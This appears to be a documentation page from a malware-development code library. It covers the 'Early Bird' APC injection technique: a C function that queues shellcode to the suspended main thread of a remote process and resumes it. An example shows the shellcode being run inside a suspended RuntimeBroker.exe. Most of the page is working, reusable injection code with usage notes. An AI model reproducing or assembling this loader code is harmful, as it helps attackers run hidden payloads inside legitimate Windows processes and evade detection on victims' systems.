## Remote APC Injection (Early Bird) via Suspended Process

Executes a payload already written to a remote process using Early Bird APC Injection. Queues the payload's remote base address to the process's suspended primary thread via `QueueUserAPC`, then resumes the thread with `ResumeThread`, causing the queued APC to execute when the thread enters an alertable state. Requires the target process to have been created in a suspended state via `CreateSuspendedProcess2` and the payload to have been written via `InjectShellcodeToRemoteProcess`.

**Usage**

Call `EarlyBirdApcInjection` with the suspended thread handle and the remote payload address. After a `TRUE` return, `ResumeThread` resumes the suspended thread and allows the queued APC to execute.

- `IN HANDLE hThread` Handle to the suspended primary thread of the remote process.
    
- `IN PVOID pAddress` Base address of the payload in the remote process's address space.
    

**Return Value**

`BOOL` Returns `TRUE` if the APC was successfully queued and the thread was resumed, otherwise `FALSE`.

**External Files**

- `windows.h` `BOOL`, `HANDLE`, `PVOID`, `QueueUserAPC()`, `ResumeThread()`, `GetLastError()`
    
- `stdio.h` `printf()`, `getchar()`
    


### Code

```c
#include <windows.h>
#include <stdio.h>


BOOL EarlyBirdApcInjection(IN HANDLE hThread, IN PVOID pAddress) {

    // Queue the payload to the suspended thread.
    // The APC will execute when the thread is resumed and enters
    // an alertable state.
    if (!QueueUserAPC(
        (PAPCFUNC)pAddress, // Address of the APC function.
        hThread,            // Handle to the suspended remote thread.
        NULL                // No parameter passed to the APC function.
    )) {
        printf("[!] QueueUserAPC Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    printf("[#] Press <Enter> To Run Shellcode ... ");
    getchar();

    // Resume the suspended thread.
    if (ResumeThread(hThread) == (DWORD)-1) {
        printf("[!] ResumeThread Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    printf("[i] Thread Resumed - Payload Queued \n");

    return TRUE;
}
```

**Example**

```c
HANDLE  hProcess    = NULL,
        hThread     = NULL;
DWORD   dwProcessId = NULL;
PVOID   pAddress    = NULL;

// Step 1: Create the target process suspended.
CreateSuspendedProcess2("RuntimeBroker.exe", &dwProcessId, &hProcess, &hThread);

// Step 2: Write and protect the payload in the remote process's address space.
InjectShellcodeToRemoteProcess(hProcess, pPayload, sPayloadSize, &pAddress);

// Step 3: Queue the payload to the suspended thread and resume it.
EarlyBirdApcInjection(hThread, pAddress);

CloseHandle(hProcess);
CloseHandle(hThread);
```
